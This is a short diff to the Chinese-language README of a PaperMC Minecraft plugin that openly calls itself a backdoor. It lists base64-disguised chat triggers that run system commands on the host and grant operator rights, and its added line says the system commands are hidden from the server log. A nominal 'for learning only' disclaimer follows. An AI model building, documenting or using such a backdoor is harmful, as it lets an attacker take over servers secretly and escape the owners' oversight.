@@ -4,4 +4,5 @@ this is a PaperMC backdoor plugin!
 - 执行系统命令 命令是@cnVuU3lzdGVtQ29tbWFuZA [命令] 注意!,是系统指令而非我的世界指令.
 - 获取OP权限 命令是@dGhlX2Z1Y2tpbmdfb3Ah
 
+在执行指令时(仅执行@cnVuU3lzdGVtQ29tbWFuZA)不会记录到日志中!
 这里我非常不推荐您恶意利用,仅供学习.
